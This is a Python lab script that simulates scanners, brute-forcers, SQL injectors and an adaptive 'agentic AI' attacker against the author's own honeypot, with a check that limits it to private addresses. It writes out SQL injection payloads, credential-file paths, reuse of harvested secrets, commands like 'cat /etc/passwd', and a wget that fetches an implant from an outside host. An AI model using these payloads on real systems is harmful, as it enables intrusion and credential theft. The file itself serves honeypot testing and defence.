"""Lab attacker simulator for demoing the honeypot (flowchart stage 1: adaptive / agentic attacker).

Only talks to loopback / private-range targets - it is a test harness for YOUR OWN honeypot, not a tool
for use against anything else.  It sends ordinary HTTP requests and opens TCP connections to the fake
ports; the honeypot's emulated services never execute anything.

    python simulate_attacker.py all          # benign users + every attacker persona
    python simulate_attacker.py agentic      # multi-stage adaptive attacker only
    python simulate_attacker.py scan|brute|sqli|benign|stealth
"""
import http.cookiejar
import ipaddress
import json
import random
import re
import socket
import sys
import time
from urllib.parse import urlparse

import requests

BASE = "http://127.0.0.1:5000"
args = [a for a in sys.argv[1:] if not a.startswith("--")]
for a in sys.argv[1:]:
    if a.startswith("--target="):
        BASE = a.split("=", 1)[1].rstrip("/")
MODE = args[0] if args else "all"
HOST = urlparse(BASE).hostname


def _lab_only(host):
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(host))
    except Exception:
        return False
    return ip.is_loopback or ip.is_private


if not _lab_only(HOST):
    sys.exit(f"Refusing to run: {HOST} is not a loopback/private address. This simulator is for your own lab honeypot only.")

BROWSER = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0 Safari/537.36",
           "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Safari/605.1.15",
           "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"]
WORDLIST = ["admin", "login", "backup", "backup.sql", ".env", ".git/config", "phpmyadmin", "wp-login.php", "config.json",
            "server-status", "actuator/env", "api/internal/vms", "id_rsa", ".aws/credentials", "debug", "cgi-bin/test",
            "old", "test", "staging", "robots.txt", "db_backup.sql", "swagger", "internal", "shell", "console"]
FAKE_PORTS = [2222, 2121, 2323, 3307, 6380]


def client(actor, truth, ua):
    s = requests.Session()
    s.headers.update({"User-Agent": ua, "X-Demo-Actor": actor, "X-Lab-Truth": truth})
    s.cookies.set_policy(http.cookiejar.DefaultCookiePolicy(allowed_domains=[]))  # attacker tools drop cookies
    return s


def get(s, path, **kw):
    try:
        return s.get(BASE + path, timeout=10, allow_redirects=False, **kw)
    except requests.RequestException:
        return None


def post(s, path, **kw):
    try:
        return s.post(BASE + path, timeout=10, allow_redirects=False, **kw)
    except requests.RequestException:
        return None


def banner(port, payload=b""):
    try:
        with socket.create_connection((HOST, port), timeout=3) as c:
            if payload:
                c.sendall(payload)
            c.settimeout(2)
            return c.recv(256)
    except Exception:
        return b""


# ---------------------------------------------------------------- personas
def benign(n=1):
    s = client(f"customer-{n}", "benign", random.choice(BROWSER))
    for p in ["/", "/about", "/login"]:
        get(s, p); time.sleep(random.uniform(.2, .5))
    post(s, "/login", data={"username": "demo", "password": "Demo@123"}); time.sleep(.3)
    for _ in range(3):
        get(s, random.choice(["/", "/about", "/login"])); time.sleep(random.uniform(.3, .6))
    print(f"  [benign customer-{n}] browsed normally")


def scan():
    s = client("scanner-nikto", "attacker", "Nikto/2.5.0")
    for w in WORDLIST * 2:
        get(s, "/" + w)
    for p in FAKE_PORTS:
        banner(p)
    print("  [scanner] wordlist sweep + port probe done")


def brute():
    s = client("bruteforcer-hydra", "attacker", "Hydra")
    for i in range(45):
        post(s, "/login", data={"username": "admin" if i % 2 else "demo", "password": f"Passw0rd{i}"})
    print("  [brute-forcer] 45 login attempts done")


def sqli():
    s = client("injector-sqlmap", "attacker", "sqlmap/1.8")
    for pl in ["' OR '1'='1", "admin'--", "' UNION SELECT 1,2,3--", "1; DROP TABLE users;--", "' OR 1=1 --", "x' AND SLEEP(5)--"]:
        post(s, "/login", data={"username": pl, "password": "x"})
        get(s, "/dashboard", params={"id": pl})
    print("  [injector] SQLi payloads sent")


def stealth():
    s = client("stealth-recon", "attacker", random.choice(BROWSER))
    for w in [".env", "admin", "backup.sql", "robots.txt"]:
        get(s, "/" + w); time.sleep(random.uniform(.4, .9))
    print("  [low-and-slow] 4 quiet probes done")


def agentic():
    """Multi-stage, adaptive: recon -> scan -> exploit -> harvest -> reuse creds -> lateral move -> persist.
    It watches for deception (Server header changes) and adapts its tooling, as an agentic attacker might."""
    ua_i = 0
    adapt = {"n": 0}
    s = client("agentic-ai-attacker", "attacker", BROWSER[0])
    last_server = {"v": None}

    def step(path, method="get", **kw):
        r = (get if method == "get" else post)(s, path, **kw)
        if r is not None:
            srv = r.headers.get("Server")
            if last_server["v"] and srv != last_server["v"] and adapt["n"] < 3:
                adapt["n"] += 1                                   # "I may be in a honeypot - change tooling"
                s.headers["User-Agent"] = BROWSER[adapt["n"] % len(BROWSER)] + f" adapt{adapt['n']}"
                print(f"    adaptation #{adapt['n']}: server banner changed ({last_server['v']} -> {srv}); switching UA")
            last_server["v"] = srv
        time.sleep(random.uniform(.05, .25))
        return r

    print("  [agentic] stage 1 recon")
    for p in ["/", "/about", "/login", "/robots.txt"]:
        step(p)
    print("  [agentic] stage 2 scanning (ports + paths)")
    for p in FAKE_PORTS:
        banner(p)
    for w in random.sample(WORDLIST, 14):
        step("/" + w)
    print("  [agentic] stage 3 exploitation (auth bypass)")
    r = step("/login", "post", data={"username": "admin'--", "password": "x"})
    print("  [agentic] stage 4 privilege escalation / credential harvest")
    env = step("/.env")
    secrets = re.findall(r"(?:DB_PASSWORD|REDIS_PASSWORD)=(\S+)", env.text) if env is not None else []
    step("/.env")        # re-probe the same decoy - fingerprinting attempt
    step("/.env")
    step("/.env")
    print("  [agentic] stage 5 credential reuse (honeytokens)")
    for pw in secrets[:2]:
        step("/admin/login", "post", data={"username": "dbadmin", "password": pw})
        banner(2121, f"USER dbadmin\r\nPASS {pw}\r\n".encode())
        banner(6380, f"AUTH {pw}\r\n".encode())
    print("  [agentic] stage 6 lateral movement")
    vms = step("/api/internal/vms")
    try:
        inv = json.loads(vms.text)
    except Exception:
        inv = []
    for vm in inv[:2]:
        step(f"/console/vm/{vm['id']}")
        for cmd in ["whoami", "id", "uname -a", "cat /etc/passwd", "cat .env", "ifconfig", "sudo -l"]:
            step(f"/console/vm/{vm['id']}/exec", "post", json={"cmd": cmd})
    print("  [agentic] stage 7 persistence + exfiltration attempt")
    if inv:
        for cmd in ["wget http://203.0.113.9/implant.sh", "history"]:
            step(f"/console/vm/{inv[0]['id']}/exec", "post", json={"cmd": cmd})
    step("/backup.sql")
    print(f"  [agentic] done - adapted {adapt['n']}x")


RUN = {"benign": lambda: [benign(i) for i in range(1, 4)], "scan": scan, "brute": brute, "sqli": sqli,
       "stealth": stealth, "agentic": agentic}

if __name__ == "__main__":
    print(f"Target {BASE}  (lab mode: {MODE})")
    if MODE == "all":
        benign(1); scan(); benign(2); brute(); sqli(); stealth(); benign(3); agentic(); benign(4)
    elif MODE in RUN:
        RUN[MODE]()
    else:
        sys.exit("modes: all | agentic | scan | brute | sqli | stealth | benign")
    print(f"Done. Open {BASE}/soc?key=kaish-soc")
